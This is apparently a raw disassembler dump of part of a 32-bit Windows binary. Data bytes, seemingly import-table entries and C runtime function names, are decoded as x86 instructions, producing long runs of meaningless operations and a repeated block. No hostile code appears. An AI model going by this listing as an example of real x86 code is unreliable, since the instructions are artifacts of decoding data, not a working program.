  4132f0:	mov    es,WORD PTR [ecx+eax*1+0x0]
  4132f4:	sahf   
  4132f5:	inc    esp
  4132f6:	add    DWORD PTR [eax],eax
  4132f8:	scas   al,BYTE PTR es:[edi]
  4132f9:	inc    esp
  4132fa:	add    DWORD PTR [eax],eax
  4132fc:	mov    BYTE PTR [ecx+eax*1+0x0],0xd0
  413301:	inc    esp
  413302:	add    DWORD PTR [eax],eax
  413304:	in     al,dx
  413305:	inc    esp
  413306:	add    DWORD PTR [eax],eax
  413308:	clc    
  413309:	inc    esp
  41330a:	add    DWORD PTR [eax],eax
  41330c:	or     al,BYTE PTR [ebp+0x1]
  41330f:	add    BYTE PTR [esi],bl
  413311:	inc    ebp
  413312:	add    DWORD PTR [eax],eax
  413314:	sub    BYTE PTR [ebp+0x1],al
  413317:	add    BYTE PTR [eax],bh
  413319:	inc    ebp
  41331a:	add    DWORD PTR [eax],eax
  41331c:	inc    esp
  41331d:	inc    ebp
  41331e:	add    DWORD PTR [eax],eax
  413320:	dec    esi
  413321:	inc    ebp
  413322:	add    DWORD PTR [eax],eax
  413324:	pop    edx
  413325:	inc    ebp
  413326:	add    DWORD PTR [eax],eax
  413328:	add    BYTE PTR [eax],al
  41332a:	add    BYTE PTR [eax],al
  41332c:	jbe    0x413373
  41332e:	add    DWORD PTR [eax],eax
  413330:	mov    BYTE PTR [ebp+0x1],al
  413333:	add    BYTE PTR [eax-0x51fffebb],ah
  413339:	inc    ebp
  41333a:	add    DWORD PTR [eax],eax
  41333c:	retf   0x145
  41333f:	add    ah,bl
  413341:	inc    ebp
  413342:	add    DWORD PTR [eax],eax
  413344:	in     al,dx
  413345:	inc    ebp
  413346:	add    DWORD PTR [eax],eax
  413348:	add    BYTE PTR [esi+0x1],al
  41334b:	add    BYTE PTR [eax],bl
  41334d:	inc    esi
  41334e:	add    DWORD PTR [eax],eax
  413350:	sub    al,BYTE PTR [esi+0x1]
  413353:	add    BYTE PTR [esi],dh
  413355:	inc    esi
  413356:	add    DWORD PTR [eax],eax
  413358:	dec    edx
  413359:	inc    esi
  41335a:	add    DWORD PTR [eax],eax
  41335c:	pusha  
  41335d:	inc    esi
  41335e:	add    DWORD PTR [eax],eax
  413360:	ins    BYTE PTR es:[edi],dx
  413361:	inc    esi
  413362:	add    DWORD PTR [eax],eax
  413364:	add    BYTE PTR [esi+0x1],0x0
  413368:	xchg   esp,eax
  413369:	inc    esi
  41336a:	add    DWORD PTR [eax],eax
  41336c:	mov    al,ds:0xae000146
  413371:	inc    esi
  413372:	add    DWORD PTR [eax],eax
  413374:	ret    0x146
  413377:	add    dl,bl
  413379:	inc    esi
  41337a:	add    DWORD PTR [eax],eax
  41337c:	call   0xf24134c7
  413381:	inc    esi
  413382:	add    DWORD PTR [eax],eax
  413384:	inc    BYTE PTR [esi+0x1]
  413387:	add    BYTE PTR [esi],cl
  413389:	inc    edi
  41338a:	add    DWORD PTR [eax],eax
  41338c:	and    al,0x47
  41338e:	add    DWORD PTR [eax],eax
  413390:	cmp    al,BYTE PTR [edi+0x1]
  413393:	add    BYTE PTR [edi+eax*2+0x1],cl
  413397:	add    BYTE PTR [edx+0x47],bl
  41339a:	add    DWORD PTR [eax],eax
  41339c:	push   0x47
  41339e:	add    DWORD PTR [eax],eax
  4133a0:	jle    0x4133e9
  4133a2:	add    DWORD PTR [eax],eax
  4133a4:	xchg   esi,eax
  4133a5:	inc    edi
  4133a6:	add    DWORD PTR [eax],eax
  4133a8:	mov    ds:0xba000147,al
  4133ad:	inc    edi
  4133ae:	add    DWORD PTR [eax],eax
  4133b0:	int3   
  4133b1:	inc    edi
  4133b2:	add    DWORD PTR [eax],eax
  4133b4:	fadd   QWORD PTR [edi+0x1]
  4133b7:	add    al,dh
  4133b9:	inc    edi
  4133ba:	add    DWORD PTR [eax],eax
  4133bc:	push   es
  4133bd:	dec    eax
  4133be:	add    DWORD PTR [eax],eax
  4133c0:	sbb    cl,BYTE PTR [eax+0x1]
  4133c3:	add    BYTE PTR [eax],ch
  4133c5:	dec    eax
  4133c6:	add    DWORD PTR [eax],eax
  4133c8:	cmp    cl,BYTE PTR [eax+0x1]
  4133cb:	add    BYTE PTR [eax+0x48],cl
  4133ce:	add    DWORD PTR [eax],eax
  4133d0:	push   esp
  4133d1:	dec    eax
  4133d2:	add    DWORD PTR [eax],eax
  4133d4:	outs   dx,BYTE PTR ds:[esi]
  4133d5:	dec    eax
  4133d6:	add    DWORD PTR [eax],eax
  4133d8:	mov    BYTE PTR [eax+0x1],cl
  4133db:	add    BYTE PTR [eax-0x59fffeb8],bl
  4133e1:	dec    eax
  4133e2:	add    DWORD PTR [eax],eax
  4133e4:	mov    dl,0x48
  4133e6:	add    DWORD PTR [eax],eax
  4133e8:	ror    BYTE PTR [eax+0x1],0x0
  4133ec:	(bad)  
  4133ed:	dec    eax
  4133ee:	add    DWORD PTR [eax],eax
  4133f0:	add    BYTE PTR [eax],al
  4133f2:	add    BYTE PTR [eax],al
  4133f4:	lock dec eax
  4133f6:	add    DWORD PTR [eax],eax
  4133f8:	dec    BYTE PTR [eax+0x1]
  4133fb:	add    BYTE PTR [esi],cl
  4133fd:	dec    ecx
  4133fe:	add    DWORD PTR [eax],eax
  413400:	push   ds
  413401:	dec    ecx
  413402:	add    DWORD PTR [eax],eax
  413404:	cs dec ecx
  413406:	add    DWORD PTR [eax],eax
  413408:	add    BYTE PTR [eax],al
  41340a:	add    BYTE PTR [eax],al
  41340c:	push   eax
  41340d:	dec    ecx
  41340e:	add    DWORD PTR [eax],eax
	...
  413418:	stos   DWORD PTR es:[edi],eax
  413419:	inc    ebx
  41341a:	push   ebp
  41341b:	dec    ebp
  41341c:	add    BYTE PTR [eax],al
  41341e:	add    BYTE PTR [eax],al
  413420:	add    al,BYTE PTR [eax]
  413422:	add    BYTE PTR [eax],al
  413424:	cmp    eax,0x43000000
  413429:	dec    edx
  41342a:	add    eax,DWORD PTR [eax]
  41342c:	inc    ebx
  41342d:	cmp    al,0x3
	...
  413437:	add    BYTE PTR [ebx+0x4d5543],ch
  41343d:	add    BYTE PTR [eax],al
  41343f:	add    BYTE PTR [esi+0x34],ah
  413442:	add    DWORD PTR [eax],eax
  413444:	add    DWORD PTR [eax],eax
  413446:	add    BYTE PTR [eax],al
  413448:	add    DWORD PTR [eax],eax
  41344a:	add    BYTE PTR [eax],al
  41344c:	add    DWORD PTR [eax],eax
  41344e:	add    BYTE PTR [eax],al
  413450:	pop    esp
  413451:	xor    al,0x1
  413453:	add    BYTE PTR [eax+0x34],ah
  413456:	add    DWORD PTR [eax],eax
  413458:	fs xor al,0x1
  41345b:	add    ch,cl
  41345d:	sub    BYTE PTR [eax],al
  41345f:	add    BYTE PTR [edi+0x34],dh
  413462:	add    DWORD PTR [eax],eax
  413464:	add    BYTE PTR [eax],al
  413466:	jb     0x4134d5
  413468:	ins    DWORD PTR es:[edi],dx
  413469:	pop    ecx
  41346a:	dec    eax
  41346b:	outs   dx,DWORD PTR ds:[esi]
  41346c:	imul   ecx,DWORD PTR [eax+0x6c],0x68
  413470:	ja     0x4134e1
  413472:	imul   ebp,DWORD PTR cs:[esi+0x73],0x69483f00
  41347a:	fs gs dec ebx
  41347d:	gs jns 0x4134e2
  413480:	outs   dx,DWORD PTR ds:[esi]
  413481:	popa   
  413482:	jb     0x4134e8
  413484:	dec    esi
  413485:	gs ja  0x4134c8
  413488:	inc    eax
  413489:	pop    ecx
  41348a:	inc    edi
  41348b:	pop    eax
  41348c:	inc    esp
  41348d:	cmp    al,0x56
  41348f:	add    BYTE PTR [eax],al
  413491:	add    BYTE PTR [eax],al
  413493:	add    BYTE PTR [eax],ah
  413495:	xor    eax,0x1
  41349a:	add    BYTE PTR [eax],al
  41349c:	add    BYTE PTR [eax],al
  41349e:	add    BYTE PTR [eax],al
  4134a0:	and    bh,BYTE PTR [ebx]
  4134a2:	add    DWORD PTR [eax],eax
  4134a4:	add    BYTE PTR [eax],dh
  4134a6:	add    DWORD PTR [eax],eax
  4134a8:	aam    0x35
  4134aa:	add    DWORD PTR [eax],eax
	...
  4134b4:	je     0x4134f8
  4134b6:	add    DWORD PTR [eax],eax
  4134b8:	mov    ah,0x30
  4134ba:	add    DWORD PTR [eax],eax
  4134bc:	nop
  4134bd:	aaa    
  4134be:	add    DWORD PTR [eax],eax
	...
  4134c8:	ins    BYTE PTR es:[edi],dx
  4134c9:	inc    ebp
  4134ca:	add    DWORD PTR [eax],eax
  4134cc:	jo     0x413500
  4134ce:	add    DWORD PTR [eax],eax
  4134d0:	dec    esp
  4134d1:	cmp    BYTE PTR [ecx],al
	...
  4134db:	add    dl,ah
  4134dd:	dec    eax
  4134de:	add    DWORD PTR [eax],eax
  4134e0:	sub    al,0x33
  4134e2:	add    DWORD PTR [eax],eax
  4134e4:	adc    al,0x39
  4134e6:	add    DWORD PTR [eax],eax
	...
  4134f0:	inc    edx
  4134f1:	dec    ecx
  4134f2:	add    DWORD PTR [eax],eax
  4134f4:	hlt    
  4134f5:	xor    eax,DWORD PTR [ecx]
  4134f7:	add    BYTE PTR [ecx+edi*1],ch
  4134fa:	add    DWORD PTR [eax],eax
	...
  413504:	bound  ecx,QWORD PTR [ecx+0x1]
  413507:	add    BYTE PTR [esp+esi*1],cl
  41350a:	add    DWORD PTR [eax],eax
	...
  413520:	xor    al,0x39
  413522:	add    DWORD PTR [eax],eax
  413524:	inc    edx
  413525:	cmp    DWORD PTR [ecx],eax
  413527:	add    BYTE PTR [ecx+edi*1+0x1],cl
  41352b:	add    BYTE PTR [ecx+edi*1+0x1],dl
  41352f:	add    BYTE PTR [esi+0x39],bl
  413532:	add    DWORD PTR [eax],eax
  413534:	push   0x39
  413536:	add    DWORD PTR [eax],eax
  413538:	jl     0x413573
  41353a:	add    DWORD PTR [eax],eax
  41353c:	xchg   BYTE PTR [ecx],bh
  41353e:	add    DWORD PTR [eax],eax
  413540:	xchg   esp,eax
  413541:	cmp    DWORD PTR [ecx],eax
  413543:	add    BYTE PTR [ecx+edi*1+0x39a80001],bl
  41354a:	add    DWORD PTR [eax],eax
  41354c:	mov    ah,0x39
  41354e:	add    DWORD PTR [eax],eax
  413550:	les    edi,FWORD PTR [ecx]
  413552:	add    DWORD PTR [eax],eax
  413554:	into   
  413555:	cmp    DWORD PTR [ecx],eax
  413557:	add    dh,dl
  413559:	cmp    DWORD PTR [ecx],eax
  41355b:	add    dl,ah
  41355d:	cmp    DWORD PTR [ecx],eax
  41355f:	add    dl,ch
  413561:	cmp    DWORD PTR [ecx],eax
  413563:	add    ah,dh
  413565:	cmp    DWORD PTR [ecx],eax
  413567:	add    ah,bh
  413569:	cmp    DWORD PTR [ecx],eax
  41356b:	add    BYTE PTR [eax],cl
  41356d:	cmp    al,BYTE PTR [ecx]
  41356f:	add    BYTE PTR [edx],dl
  413571:	cmp    al,BYTE PTR [ecx]
  413573:	add    BYTE PTR [edx],bl
  413575:	cmp    al,BYTE PTR [ecx]
  413577:	add    BYTE PTR [edx+edi*1],ah
  41357a:	add    DWORD PTR [eax],eax
  41357c:	xor    BYTE PTR [edx],bh
  41357e:	add    DWORD PTR [eax],eax
  413580:	cmp    bh,BYTE PTR [edx]
  413582:	add    DWORD PTR [eax],eax
  413584:	dec    eax
  413585:	cmp    al,BYTE PTR [ecx]
  413587:	add    BYTE PTR [edx+0x3a],dl
  41358a:	add    DWORD PTR [eax],eax
  41358c:	pop    esi
  41358d:	cmp    al,BYTE PTR [ecx]
  41358f:	add    BYTE PTR [edx+edi*1+0x1],ch
  413593:	add    BYTE PTR [edx+0x3a],bh
  413596:	add    DWORD PTR [eax],eax
  413598:	test   BYTE PTR [edx],bh
  41359a:	add    DWORD PTR [eax],eax
  41359c:	mov    ?,WORD PTR [edx]
  41359e:	add    DWORD PTR [eax],eax
  4135a0:	cwde   
  4135a1:	cmp    al,BYTE PTR [ecx]
  4135a3:	add    BYTE PTR [edx-0x55fffec6],ah
  4135a9:	cmp    al,BYTE PTR [ecx]
  4135ab:	add    BYTE PTR [edx+edi*1+0x3abe0001],dh
  4135b2:	add    DWORD PTR [eax],eax
  4135b4:	enter  0x13a,0x0
  4135b8:	fdivr  QWORD PTR [edx]
  4135ba:	add    DWORD PTR [eax],eax
  4135bc:	out    0x3a,al
  4135be:	add    DWORD PTR [eax],eax
  4135c0:	repnz cmp al,BYTE PTR [ecx]
  4135c3:	add    dh,bh
  4135c5:	cmp    al,BYTE PTR [ecx]
  4135c7:	add    BYTE PTR [eax],cl
  4135c9:	cmp    eax,DWORD PTR [ecx]
  4135cb:	add    BYTE PTR [eax],bl
  4135cd:	cmp    eax,DWORD PTR [ecx]
  4135cf:	add    BYTE PTR [eax],al
  4135d1:	add    BYTE PTR [eax],al
  4135d3:	add    BYTE PTR [esi],ch
  4135d5:	cmp    eax,DWORD PTR [ecx]
  4135d7:	add    BYTE PTR [edx+0x3b],al
  4135da:	add    DWORD PTR [eax],eax
  4135dc:	pop    eax
  4135dd:	cmp    eax,DWORD PTR [ecx]
  4135df:	add    BYTE PTR [eax+0x3b],ch
  4135e2:	add    DWORD PTR [eax],eax
  4135e4:	je     0x413621
  4135e6:	add    DWORD PTR [eax],eax
  4135e8:	nop
  4135e9:	cmp    eax,DWORD PTR [ecx]
  4135eb:	add    BYTE PTR [ebx+edi*1+0x3bb40001],bl
  4135f2:	add    DWORD PTR [eax],eax
  4135f4:	int3   
  4135f5:	cmp    eax,DWORD PTR [ecx]
  4135f7:	add    dl,bl
  4135f9:	cmp    eax,DWORD PTR [ecx]
  4135fb:	add    dh,ah
  4135fd:	cmp    eax,DWORD PTR [ecx]
  4135ff:	add    al,bh
  413601:	cmp    eax,DWORD PTR [ecx]
  413603:	add    BYTE PTR [esp+edi*1],cl
  413606:	add    DWORD PTR [eax],eax
  413608:	sbb    bh,BYTE PTR [ecx+eax*1]
  41360b:	add    BYTE PTR [edx],ch
  41360d:	cmp    al,0x1
  41360f:	add    BYTE PTR [edx],bh
  413611:	cmp    al,0x1
  413613:	add    BYTE PTR [esi+0x3c],cl
  413616:	add    DWORD PTR [eax],eax
  413618:	pop    edx
  413619:	cmp    al,0x1
  41361b:	add    BYTE PTR [edx+0x3c],ch
  41361e:	add    DWORD PTR [eax],eax
  413620:	js     0x41365e
  413622:	add    DWORD PTR [eax],eax
  413624:	xchg   edx,eax
  413625:	cmp    al,0x1
  413627:	add    BYTE PTR [esp+edi*1+0x3cb20001],ah
  41362e:	add    DWORD PTR [eax],eax
  413630:	ret    0x13c
  413633:	add    ah,dl
  413635:	cmp    al,0x1
  413637:	add    dh,ah
  413639:	cmp    al,0x1
  41363b:	add    ah,dh
  41363d:	cmp    al,0x1
  41363f:	add    dh,bh
  413641:	cmp    al,0x1
  413643:	add    BYTE PTR [esi],cl
  413645:	cmp    eax,0x3d1e0001
  41364a:	add    DWORD PTR [eax],eax
  41364c:	sub    al,0x3d
  41364e:	add    DWORD PTR [eax],eax
  413650:	cmp    bh,BYTE PTR ds:0x3d4c0001
  413656:	add    DWORD PTR [eax],eax
  413658:	pop    eax
  413659:	cmp    eax,0x3d6e0001
  41365e:	add    DWORD PTR [eax],eax
  413660:	cmp    BYTE PTR ds:0x3d920001,0x1
  413667:	add    BYTE PTR [esi-0x45fffec3],ah
  41366d:	cmp    eax,0x3dce0001
  413672:	add    DWORD PTR [eax],eax
  413674:	jmp    0x13d:0xf800013d
  41367b:	add    BYTE PTR [esi],al
  41367d:	add    DWORD PTR ds:[eax],eax
  413680:	sbb    al,0x3e
  413682:	add    DWORD PTR [eax],eax
  413684:	sub    bh,BYTE PTR [esi]
  413686:	add    DWORD PTR [eax],eax
  413688:	cmp    al,0x3e
  41368a:	add    DWORD PTR [eax],eax
  41368c:	dec    eax
  41368d:	add    DWORD PTR ds:[eax],eax
  413690:	pop    esp
  413691:	add    DWORD PTR ds:[eax],eax
  413694:	ins    BYTE PTR es:[edi],dx
  413695:	add    DWORD PTR ds:[eax],eax
  413698:	jl     0x4136d8
  41369a:	add    DWORD PTR [eax],eax
  41369c:	mov    BYTE PTR [esi],bh
  41369e:	add    DWORD PTR [eax],eax
  4136a0:	cwde   
  4136a1:	add    DWORD PTR ds:[eax],eax
  4136a4:	lods   al,BYTE PTR ds:[esi]
  4136a5:	add    DWORD PTR ds:[eax],eax
  4136a8:	mov    edx,0xcc00013e
  4136ad:	add    DWORD PTR ds:[eax],eax
  4136b0:	fidivr DWORD PTR [esi]
  4136b2:	add    DWORD PTR [eax],eax
  4136b4:	lock add DWORD PTR ds:[eax],eax
  4136b8:	(bad)  
  4136b9:	add    DWORD PTR ds:[eax],eax
  4136bc:	push   cs
  4136bd:	aas    
  4136be:	add    DWORD PTR [eax],eax
  4136c0:	sbb    bh,BYTE PTR [edi]
  4136c2:	add    DWORD PTR [eax],eax
  4136c4:	sub    bh,BYTE PTR [edi]
  4136c6:	add    DWORD PTR [eax],eax
  4136c8:	cmp    BYTE PTR [edi],bh
  4136ca:	add    DWORD PTR [eax],eax
  4136cc:	dec    esi
  4136cd:	aas    
  4136ce:	add    DWORD PTR [eax],eax
  4136d0:	bound  edi,QWORD PTR [edi]
  4136d2:	add    DWORD PTR [eax],eax
  4136d4:	outs   dx,BYTE PTR ds:[esi]
  4136d5:	aas    
  4136d6:	add    DWORD PTR [eax],eax
  4136d8:	js     0x413719
  4136da:	add    DWORD PTR [eax],eax
  4136dc:	xchg   BYTE PTR [edi],bh
  4136de:	add    DWORD PTR [eax],eax
  4136e0:	xchg   esp,eax
  4136e1:	aas    
  4136e2:	add    DWORD PTR [eax],eax
  4136e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136e5:	aas    
  4136e6:	add    DWORD PTR [eax],eax
  4136e8:	mov    dh,0x3f
  4136ea:	add    DWORD PTR [eax],eax
  4136ec:	enter  0x13f,0x0
  4136f0:	fidivr DWORD PTR [edi]
  4136f2:	add    DWORD PTR [eax],eax
  4136f4:	in     al,dx
  4136f5:	aas    
  4136f6:	add    DWORD PTR [eax],eax
  4136f8:	clc    
  4136f9:	aas    
  4136fa:	add    DWORD PTR [eax],eax
  4136fc:	or     al,BYTE PTR [eax+0x1]
  4136ff:	add    BYTE PTR [edx],ah
  413701:	inc    eax
  413702:	add    DWORD PTR [eax],eax
  413704:	xor    al,0x40
  413706:	add    DWORD PTR [eax],eax
  413708:	dec    eax
  413709:	inc    eax
  41370a:	add    DWORD PTR [eax],eax
  41370c:	pop    edx
  41370d:	inc    eax
  41370e:	add    DWORD PTR [eax],eax
  413710:	fs inc eax
  413712:	add    DWORD PTR [eax],eax
  413714:	je     0x413756
  413716:	add    DWORD PTR [eax],eax
  413718:	add    BYTE PTR [eax+0x1],0x0
  41371c:	cwde   
  41371d:	inc    eax
  41371e:	add    DWORD PTR [eax],eax
  413720:	lods   al,BYTE PTR ds:[esi]
  413721:	inc    eax
  413722:	add    DWORD PTR [eax],eax
  413724:	mov    esp,0xca000140
  413729:	inc    eax
  41372a:	add    DWORD PTR [eax],eax
  41372c:	loopne 0x41376e
  41372e:	add    DWORD PTR [eax],eax
  413730:	lock inc eax
  413732:	add    DWORD PTR [eax],eax
  413734:	or     BYTE PTR [ecx+0x1],al
  413737:	add    BYTE PTR [esi],dl
  413739:	inc    ecx
  41373a:	add    DWORD PTR [eax],eax
  41373c:	sub    BYTE PTR [ecx+0x1],al
  41373f:	add    BYTE PTR [esi],dh
  413741:	inc    ecx
  413742:	add    DWORD PTR [eax],eax
  413744:	inc    esp
  413745:	inc    ecx
  413746:	add    DWORD PTR [eax],eax
  413748:	push   edx
  413749:	inc    ecx
  41374a:	add    DWORD PTR [eax],eax
  41374c:	pusha  
  41374d:	inc    ecx
  41374e:	add    DWORD PTR [eax],eax
  413750:	jo     0x413793
  413752:	add    DWORD PTR [eax],eax
  413754:	test   BYTE PTR [ecx+0x1],al
  413757:	add    BYTE PTR [edx-0x5ffffebf],dl
  41375d:	inc    ecx
  41375e:	add    DWORD PTR [eax],eax
  413760:	scas   al,BYTE PTR es:[edi]
  413761:	inc    ecx
  413762:	add    DWORD PTR [eax],eax
  413764:	mov    esi,0xd6000141
  413769:	inc    ecx
  41376a:	add    DWORD PTR [eax],eax
  41376c:	call   0xfa4138b2
  413771:	inc    ecx
  413772:	add    DWORD PTR [eax],eax
  413774:	push   es
  413775:	inc    edx
  413776:	add    DWORD PTR [eax],eax
  413778:	sbb    BYTE PTR [edx+0x1],al
  41377b:	add    BYTE PTR [esi],ch
  41377d:	inc    edx
  41377e:	add    DWORD PTR [eax],eax
  413780:	cmp    al,BYTE PTR [edx+0x1]
  413783:	add    BYTE PTR [esi+0x42],cl
  413786:	add    DWORD PTR [eax],eax
  413788:	pusha  
  413789:	inc    edx
  41378a:	add    DWORD PTR [eax],eax
  41378c:	add    BYTE PTR [eax],al
  41378e:	add    BYTE PTR [eax],al
  413790:	add    BYTE PTR [edx+0x1],0x0
  413794:	cwde   
  413795:	inc    edx
  413796:	add    DWORD PTR [eax],eax
  413798:	scas   al,BYTE PTR es:[edi]
  413799:	inc    edx
  41379a:	add    DWORD PTR [eax],eax
  41379c:	mov    edx,0xca000142
  4137a1:	inc    edx
  4137a2:	add    DWORD PTR [eax],eax
  4137a4:	fadd   QWORD PTR [edx+0x1]
  4137a7:	add    ah,ch
  4137a9:	inc    edx
  4137aa:	add    DWORD PTR [eax],eax
  4137ac:	clc    
  4137ad:	inc    edx
  4137ae:	add    DWORD PTR [eax],eax
  4137b0:	push   cs
  4137b1:	inc    ebx
  4137b2:	add    DWORD PTR [eax],eax
  4137b4:	sbb    BYTE PTR [ebx+0x1],al
  4137b7:	add    BYTE PTR [ebx+eax*2],ah
  4137ba:	add    DWORD PTR [eax],eax
  4137bc:	xor    al,BYTE PTR [ebx+0x1]
  4137bf:	add    BYTE PTR [edx+0x43],al
  4137c2:	add    DWORD PTR [eax],eax
  4137c4:	push   eax
  4137c5:	inc    ebx
  4137c6:	add    DWORD PTR [eax],eax
  4137c8:	pop    edx
  4137c9:	inc    ebx
  4137ca:	add    DWORD PTR [eax],eax
  4137cc:	outs   dx,BYTE PTR ds:[esi]
  4137cd:	inc    ebx
  4137ce:	add    DWORD PTR [eax],eax
  4137d0:	test   BYTE PTR [ebx+0x1],al
  4137d3:	add    BYTE PTR [ebx+eax*2+0x43a40001],dl
  4137da:	add    DWORD PTR [eax],eax
  4137dc:	mov    eax,0xcc000143
  4137e1:	inc    ebx
  4137e2:	add    DWORD PTR [eax],eax
  4137e4:	fiadd  DWORD PTR [ebx+0x1]
  4137e7:	add    dl,ch
  4137e9:	inc    ebx
  4137ea:	add    DWORD PTR [eax],eax
  4137ec:	clc    
  4137ed:	inc    ebx
  4137ee:	add    DWORD PTR [eax],eax
  4137f0:	or     BYTE PTR [ecx+eax*1+0x0],al
  4137f4:	adc    al,0x44
  4137f6:	add    DWORD PTR [eax],eax
  4137f8:	and    BYTE PTR [ecx+eax*1+0x0],al
  4137fc:	xor    al,0x44
  4137fe:	add    DWORD PTR [eax],eax
  413800:	inc    esi
  413801:	inc    esp
  413802:	add    DWORD PTR [eax],eax
  413804:	pop    edx
  413805:	inc    esp
  413806:	add    DWORD PTR [eax],eax
  413808:	inc    sp
  41380a:	add    DWORD PTR [eax],eax
  41380c:	jbe    0x413852
  41380e:	add    DWORD PTR [eax],eax
  413810:	mov    es,WORD PTR [ecx+eax*1+0x0]
  413814:	sahf   
  413815:	inc    esp
  413816:	add    DWORD PTR [eax],eax
  413818:	scas   al,BYTE PTR es:[edi]
  413819:	inc    esp
  41381a:	add    DWORD PTR [eax],eax
  41381c:	mov    BYTE PTR [ecx+eax*1+0x0],0xd0
  413821:	inc    esp
  413822:	add    DWORD PTR [eax],eax
  413824:	in     al,dx
  413825:	inc    esp
  413826:	add    DWORD PTR [eax],eax
  413828:	clc    
  413829:	inc    esp
  41382a:	add    DWORD PTR [eax],eax
  41382c:	or     al,BYTE PTR [ebp+0x1]
  41382f:	add    BYTE PTR [esi],bl
  413831:	inc    ebp
  413832:	add    DWORD PTR [eax],eax
  413834:	sub    BYTE PTR [ebp+0x1],al
  413837:	add    BYTE PTR [eax],bh
  413839:	inc    ebp
  41383a:	add    DWORD PTR [eax],eax
  41383c:	inc    esp
  41383d:	inc    ebp
  41383e:	add    DWORD PTR [eax],eax
  413840:	dec    esi
  413841:	inc    ebp
  413842:	add    DWORD PTR [eax],eax
  413844:	pop    edx
  413845:	inc    ebp
  413846:	add    DWORD PTR [eax],eax
  413848:	add    BYTE PTR [eax],al
  41384a:	add    BYTE PTR [eax],al
  41384c:	jbe    0x413893
  41384e:	add    DWORD PTR [eax],eax
  413850:	mov    BYTE PTR [ebp+0x1],al
  413853:	add    BYTE PTR [eax-0x51fffebb],ah
  413859:	inc    ebp
  41385a:	add    DWORD PTR [eax],eax
  41385c:	retf   0x145
  41385f:	add    ah,bl
  413861:	inc    ebp
  413862:	add    DWORD PTR [eax],eax
  413864:	in     al,dx
  413865:	inc    ebp
  413866:	add    DWORD PTR [eax],eax
  413868:	add    BYTE PTR [esi+0x1],al
  41386b:	add    BYTE PTR [eax],bl
  41386d:	inc    esi
  41386e:	add    DWORD PTR [eax],eax
  413870:	sub    al,BYTE PTR [esi+0x1]
  413873:	add    BYTE PTR [esi],dh
  413875:	inc    esi
  413876:	add    DWORD PTR [eax],eax
  413878:	dec    edx
  413879:	inc    esi
  41387a:	add    DWORD PTR [eax],eax
  41387c:	pusha  
  41387d:	inc    esi
  41387e:	add    DWORD PTR [eax],eax
  413880:	ins    BYTE PTR es:[edi],dx
  413881:	inc    esi
  413882:	add    DWORD PTR [eax],eax
  413884:	add    BYTE PTR [esi+0x1],0x0
  413888:	xchg   esp,eax
  413889:	inc    esi
  41388a:	add    DWORD PTR [eax],eax
  41388c:	mov    al,ds:0xae000146
  413891:	inc    esi
  413892:	add    DWORD PTR [eax],eax
  413894:	ret    0x146
  413897:	add    dl,bl
  413899:	inc    esi
  41389a:	add    DWORD PTR [eax],eax
  41389c:	call   0xf24139e7
  4138a1:	inc    esi
  4138a2:	add    DWORD PTR [eax],eax
  4138a4:	inc    BYTE PTR [esi+0x1]
  4138a7:	add    BYTE PTR [esi],cl
  4138a9:	inc    edi
  4138aa:	add    DWORD PTR [eax],eax
  4138ac:	and    al,0x47
  4138ae:	add    DWORD PTR [eax],eax
  4138b0:	cmp    al,BYTE PTR [edi+0x1]
  4138b3:	add    BYTE PTR [edi+eax*2+0x1],cl
  4138b7:	add    BYTE PTR [edx+0x47],bl
  4138ba:	add    DWORD PTR [eax],eax
  4138bc:	push   0x47
  4138be:	add    DWORD PTR [eax],eax
  4138c0:	jle    0x413909
  4138c2:	add    DWORD PTR [eax],eax
  4138c4:	xchg   esi,eax
  4138c5:	inc    edi
  4138c6:	add    DWORD PTR [eax],eax
  4138c8:	mov    ds:0xba000147,al
  4138cd:	inc    edi
  4138ce:	add    DWORD PTR [eax],eax
  4138d0:	int3   
  4138d1:	inc    edi
  4138d2:	add    DWORD PTR [eax],eax
  4138d4:	fadd   QWORD PTR [edi+0x1]
  4138d7:	add    al,dh
  4138d9:	inc    edi
  4138da:	add    DWORD PTR [eax],eax
  4138dc:	push   es
  4138dd:	dec    eax
  4138de:	add    DWORD PTR [eax],eax
  4138e0:	sbb    cl,BYTE PTR [eax+0x1]
  4138e3:	add    BYTE PTR [eax],ch
  4138e5:	dec    eax
  4138e6:	add    DWORD PTR [eax],eax
  4138e8:	cmp    cl,BYTE PTR [eax+0x1]
  4138eb:	add    BYTE PTR [eax+0x48],cl
  4138ee:	add    DWORD PTR [eax],eax
  4138f0:	push   esp
  4138f1:	dec    eax
  4138f2:	add    DWORD PTR [eax],eax
  4138f4:	outs   dx,BYTE PTR ds:[esi]
  4138f5:	dec    eax
  4138f6:	add    DWORD PTR [eax],eax
  4138f8:	mov    BYTE PTR [eax+0x1],cl
  4138fb:	add    BYTE PTR [eax-0x59fffeb8],bl
  413901:	dec    eax
  413902:	add    DWORD PTR [eax],eax
  413904:	mov    dl,0x48
  413906:	add    DWORD PTR [eax],eax
  413908:	ror    BYTE PTR [eax+0x1],0x0
  41390c:	(bad)  
  41390d:	dec    eax
  41390e:	add    DWORD PTR [eax],eax
  413910:	add    BYTE PTR [eax],al
  413912:	add    BYTE PTR [eax],al
  413914:	lock dec eax
  413916:	add    DWORD PTR [eax],eax
  413918:	dec    BYTE PTR [eax+0x1]
  41391b:	add    BYTE PTR [esi],cl
  41391d:	dec    ecx
  41391e:	add    DWORD PTR [eax],eax
  413920:	push   ds
  413921:	dec    ecx
  413922:	add    DWORD PTR [eax],eax
  413924:	cs dec ecx
  413926:	add    DWORD PTR [eax],eax
  413928:	add    BYTE PTR [eax],al
  41392a:	add    BYTE PTR [eax],al
  41392c:	push   eax
  41392d:	dec    ecx
  41392e:	add    DWORD PTR [eax],eax
  413930:	add    BYTE PTR [eax],al
  413932:	add    BYTE PTR [eax],al
  413934:	cmc    
  413935:	add    BYTE PTR [edi+0x63],bl
  413938:	outs   dx,DWORD PTR ds:[esi]
  413939:	outs   dx,BYTE PTR ds:[esi]
  41393a:	je     0x4139ae
  41393c:	outs   dx,DWORD PTR ds:[esi]
  41393d:	ins    BYTE PTR es:[edi],dx
  41393e:	data16 jo 0x413941
  413941:	add    BYTE PTR [ebp+0x3],bl
  413944:	arpl   WORD PTR [ecx+0x6c],sp
  413947:	ins    BYTE PTR es:[edi],dx
  413948:	outs   dx,DWORD PTR ds:[esi]
  413949:	arpl   WORD PTR [eax],ax
  41394b:	add    BYTE PTR [edx+0x3],dh
  41394e:	data16 ins BYTE PTR es:[edi],dx
  413950:	outs   dx,DWORD PTR ds:[esi]
  413951:	outs   dx,DWORD PTR ds:[esi]
  413952:	jb     0x413954
  413954:	push   ds
